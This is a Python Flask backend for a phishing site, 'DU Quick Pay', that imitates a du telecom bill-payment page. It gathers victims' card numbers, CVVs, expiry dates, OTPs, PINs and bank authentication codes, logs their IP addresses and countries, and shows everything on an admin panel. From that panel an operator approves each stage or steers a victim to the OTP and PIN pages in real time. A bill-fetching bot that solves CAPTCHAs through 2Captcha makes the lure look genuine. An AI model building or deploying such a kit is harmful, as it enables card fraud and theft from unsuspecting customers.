#!/usr/bin/env python3
"""
DU Quick Pay - Backend Server with Bill Fetcher Bot
Manages sessions, admin decisions, polling, country detection, and bill fetching
"""

from flask import Flask, request, jsonify, send_from_directory, session
from flask_cors import CORS
import json
import os
import time
import uuid
import threading
import urllib.request
import hashlib
import secrets
from du_bot import DUBillBot

app = Flask(__name__, static_folder='.', static_url_path='')
app.secret_key = secrets.token_hex(32)
CORS(app, supports_credentials=True)

# ===== كلمة سر الأدمين =====
ADMIN_PASSWORD = "sania2024"  # يمكن تغييرها هنا

# ===== مفتاح 2Captcha API =====
CAPTCHA_API_KEY = os.environ.get('CAPTCHA_API_KEY', '')

# تخزين الجلسات في الذاكرة
sessions = {}
sessions_lock = threading.Lock()

# جلسات الأدمين المصادق عليها
admin_sessions = set()

# تهيئة البوت
du_bot = DUBillBot(captcha_api_key=CAPTCHA_API_KEY)

# ============================================================
# كشف الدولة من IP
# ============================================================
def get_country_from_ip(ip):
    try:
        if ip in ('127.0.0.1', '::1') or ip.startswith('192.168.') or ip.startswith('10.'):
            return 'محلي'
        url = f'https://ipapi.co/{ip}/json/'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode())
            country = data.get('country_name', '')
            if country:
                return country
    except Exception:
        pass
    try:
        url2 = f'http://ip-api.com/json/{ip}?fields=country'
        req2 = urllib.request.Request(url2, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req2, timeout=3) as resp2:
            data2 = json.loads(resp2.read().decode())
            return data2.get('country', 'غير معروف')
    except Exception:
        return 'غير معروف'

def cleanup_old_sessions():
    while True:
        time.sleep(600)
        now = time.time()
        with sessions_lock:
            to_delete = [sid for sid, s in sessions.items() if now - s.get('created_at', 0) > 7200]
            for sid in to_delete:
                del sessions[sid]

threading.Thread(target=cleanup_old_sessions, daemon=True).start()

# ============================================================
# صفحات HTML الثابتة
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index_en.html')

@app.route('/en')
def index_en():
    return send_from_directory('.', 'index_en.html')

@app.route('/ar')
def index_ar():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('.', path)

# ============================================================
# API - مصادقة الأدمين
# ============================================================
@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.get_json() or {}
    password = data.get('password', '')
    if password == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        admin_sessions.add(token)
        return jsonify({'success': True, 'token': token})
    return jsonify({'success': False, 'error': 'كلمة السر غير صحيحة'}), 401

@app.route('/api/admin/verify', methods=['POST'])
def admin_verify():
    data = request.get_json() or {}
    token = data.get('token', '')
    if token in admin_sessions:
        return jsonify({'success': True})
    return jsonify({'success': False}), 401

@app.route('/api/admin/logout', methods=['POST'])
def admin_logout():
    data = request.get_json() or {}
    token = data.get('token', '')
    admin_sessions.discard(token)
    return jsonify({'success': True})

def require_admin(f):
    """Decorator للتحقق من مصادقة الأدمين"""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Admin-Token', '')
        if not token or token not in admin_sessions:
            return jsonify({'success': False, 'error': 'غير مصرح'}), 401
        return f(*args, **kwargs)
    return decorated

# ============================================================
# API - جلب الفاتورة من du
# ============================================================
@app.route('/api/bill/fetch', methods=['POST'])
def fetch_bill():
    """جلب الفاتورة برقم الهاتف"""
    data = request.get_json() or {}
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'error': 'رقم الهاتف مطلوب'}), 400
    
    try:
        # جلب الفاتورة مع حل CAPTCHA التلقائي
        result = du_bot.fetch_bill_with_auto_captcha(phone)
        
        if result:
            return jsonify(result)
        else:
            return jsonify({
                'success': False,
                'error': 'فشل في جلب الفاتورة'
            }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'خطأ: {str(e)}'
        }), 500

@app.route('/api/bill/captcha', methods=['GET'])
def get_captcha():
    """جلب صورة CAPTCHA"""
    try:
        captcha_data = du_bot.get_captcha_image()
        
        if captcha_data:
            image_base64, captcha_id = captcha_data
            return jsonify({
                'success': True,
                'image': image_base64,
                'captcha_id': captcha_id
            })
        else:
            return jsonify({
                'success': False,
                'error': 'فشل في جلب CAPTCHA'
            }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'خطأ: {str(e)}'
        }), 500

@app.route('/api/bill/solve-captcha', methods=['POST'])
def solve_captcha():
    """حل CAPTCHA يدوياً"""
    data = request.get_json() or {}
    image_base64 = data.get('image', '')
    
    if not image_base64:
        return jsonify({'success': False, 'error': 'صورة CAPTCHA مطلوبة'}), 400
    
    try:
        answer = du_bot.solve_captcha_with_2captcha(image_base64)
        
        if answer:
            return jsonify({
                'success': True,
                'answer': answer
            })
        else:
            return jsonify({
                'success': False,
                'error': 'فشل في حل CAPTCHA'
            }), 500
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'خطأ: {str(e)}'
        }), 500

# ============================================================
# API - إنشاء جلسة مبدئية (عند الضغط على التالي - رقم التليفون فقط)
# ============================================================
@app.route('/api/session/init', methods=['POST'])
def init_session():
    """يُستدعى فور ضغط العميل على التالي - يُرسل رقم التليفون للأدمين فوراً"""
    data = request.get_json() or {}
    session_id = str(uuid.uuid4())

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    with sessions_lock:
        sessions[session_id] = {
            'id': session_id,
            'created_at': time.time(),
            'updated_at': time.time(),
            'phone': data.get('phone', ''),
            'amount': '',
            'mode': data.get('mode', 'pay'),
            'card_number': '',
            'card_name': '',
            'card_expiry': '',
            'card_cvv': '',
            'stage': 'browsing',  # مرحلة التصفح - قبل إدخال البطاقة
            'decision': None,
            'otp': '',
            'pin': '',
            'bank_auth': '',
            'ip': ip,
            'country': 'جاري الكشف...',
            'forced_page': None,
            'bill_data': None,
        }

    # كشف الدولة في الخلفية
    def fetch_country(sid, client_ip):
        c = get_country_from_ip(client_ip)
        with sessions_lock:
            if sid in sessions:
                sessions[sid]['country'] = c
    threading.Thread(target=fetch_country, args=(session_id, ip), daemon=True).start()

    return jsonify({'success': True, 'session_id': session_id})

# ============================================================
# API - إنشاء جلسة كاملة (عند الدفع بالبطاقة)
# ============================================================
@app.route('/api/session/create', methods=['POST'])
def create_session():
    data = request.get_json() or {}
    session_id = data.get('session_id')  # قد يكون موجوداً من init

    with sessions_lock:
        if session_id and session_id in sessions:
            # تحديث الجلسة الموجودة
            s = sessions[session_id]
            s['amount'] = data.get('amount', s.get('amount', ''))
            s['mode'] = data.get('mode', s.get('mode', 'pay'))
            s['card_number'] = data.get('card_number', '')
            s['card_name'] = data.get('card_name', '')
            s['card_expiry'] = data.get('card_expiry', '')
            s['card_cvv'] = data.get('card_cvv', '')
            s['stage'] = 'card_pending'
            s['decision'] = None
            s['forced_page'] = None
            s['updated_at'] = time.time()
        else:
            # إنشاء جلسة جديدة
            session_id = str(uuid.uuid4())
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            if ip and ',' in ip:
                ip = ip.split(',')[0].strip()

            sessions[session_id] = {
                'id': session_id,
                'created_at': time.time(),
                'updated_at': time.time(),
                'phone': data.get('phone', ''),
                'amount': data.get('amount', ''),
                'mode': data.get('mode', 'pay'),
                'card_number': data.get('card_number', ''),
                'card_name': data.get('card_name', ''),
                'card_expiry': data.get('card_expiry', ''),
                'card_cvv': data.get('card_cvv', ''),
                'stage': 'card_pending',
                'decision': None,
                'otp': '',
                'pin': '',
                'bank_auth': '',
                'ip': ip,
                'country': 'جاري الكشف...',
                'forced_page': None,
                'bill_data': None,
            }

            def fetch_country(sid, client_ip):
                c = get_country_from_ip(client_ip)
                with sessions_lock:
                    if sid in sessions:
                        sessions[sid]['country'] = c
            threading.Thread(target=fetch_country, args=(session_id, ip), daemon=True).start()

    return jsonify({'success': True, 'session_id': session_id})

# ============================================================
# API - تحديث بيانات الجلسة
# ============================================================
@app.route('/api/session/update', methods=['POST'])
def update_session():
    data = request.get_json() or {}
    session_id = data.get('session_id')

    with sessions_lock:
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'session not found'}), 404

        s = sessions[session_id]
        if 'otp' in data:
            s['otp'] = data['otp']
        if 'pin' in data:
            s['pin'] = data['pin']
        if 'bank_auth' in data:
            s['bank_auth'] = data['bank_auth']
        if 'stage' in data:
            s['stage'] = data['stage']
            s['decision'] = None
            s['forced_page'] = None
        if 'amount' in data:
            s['amount'] = data['amount']
        if 'mode' in data:
            s['mode'] = data['mode']
        if 'bill_data' in data:
            s['bill_data'] = data['bill_data']
        s['updated_at'] = time.time()

    return jsonify({'success': True})

# ============================================================
# API - polling من العميل
# ============================================================
@app.route('/api/session/poll', methods=['GET'])
def poll_session():
    session_id = request.args.get('session_id')

    with sessions_lock:
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'session not found'}), 404

        s = sessions[session_id]
        forced = s.get('forced_page')
        # مسح forced_page بعد إرساله مرة واحدة للعميل
        if forced:
            s['forced_page'] = None
        return jsonify({
            'success': True,
            'stage': s['stage'],
            'decision': s['decision'],
            'forced_page': forced,
            'bill_data': s.get('bill_data'),
        })

# ============================================================
# API - الأدمين يجلب كل الجلسات
# ============================================================
@app.route('/api/admin/sessions', methods=['GET'])
@require_admin
def admin_sessions_list():
    with sessions_lock:
        result = []
        for s in sessions.values():
            result.append({
                'id': s['id'],
                'phone': s['phone'],
                'amount': s['amount'],
                'mode': s['mode'],
                'card_number': s['card_number'],
                'card_name': s['card_name'],
                'card_expiry': s['card_expiry'],
                'card_cvv': s['card_cvv'],
                'stage': s['stage'],
                'decision': s['decision'],
                'otp': s['otp'],
                'pin': s['pin'],
                'bank_auth': s.get('bank_auth', ''),
                'ip': s.get('ip', ''),
                'country': s.get('country', 'غير معروف'),
                'forced_page': s.get('forced_page'),
                'bill_data': s.get('bill_data'),
                'created_at': s['created_at'],
                'updated_at': s['updated_at'],
            })
        result.sort(key=lambda x: x['updated_at'], reverse=True)

    return jsonify({'success': True, 'sessions': result})

# ============================================================
# API - الأدمين يتخذ قرار
# ============================================================
@app.route('/api/admin/decide', methods=['POST'])
@require_admin
def admin_decide():
    data = request.get_json() or {}
    session_id = data.get('session_id')
    decision = data.get('decision')

    if decision not in ('approve', 'reject'):
        return jsonify({'success': False, 'error': 'invalid decision'}), 400

    with sessions_lock:
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'session not found'}), 404

        s = sessions[session_id]
        s['decision'] = decision
        s['updated_at'] = time.time()

        stage = s['stage']
        if stage == 'card_pending':
            s['stage'] = 'card_approved' if decision == 'approve' else 'card_rejected'
        elif stage == 'otp_pending':
            s['stage'] = 'otp_approved' if decision == 'approve' else 'otp_rejected'
        elif stage == 'pin_pending':
            s['stage'] = 'pin_approved' if decision == 'approve' else 'pin_rejected'
        elif stage == 'bank_auth_pending':
            s['stage'] = 'bank_auth_approved' if decision == 'approve' else 'bank_auth_rejected'

    return jsonify({'success': True})

# ============================================================
# API - الأدمين يوجّه العميل لصفحة معينة فوراً
# ============================================================
@app.route('/api/admin/navigate', methods=['POST'])
@require_admin
def admin_navigate():
    data = request.get_json() or {}
    session_id = data.get('session_id')
    page = data.get('page')

    valid_pages = ['step_1', 'step_2', 'step_3', 'step_loading', 'step_otp', 'step_pin', 'step_bank_auth', 'step_success']
    if page not in valid_pages:
        return jsonify({'success': False, 'error': 'invalid page'}), 400

    with sessions_lock:
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'session not found'}), 404

        s = sessions[session_id]
        s['forced_page'] = page
        s['updated_at'] = time.time()

    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
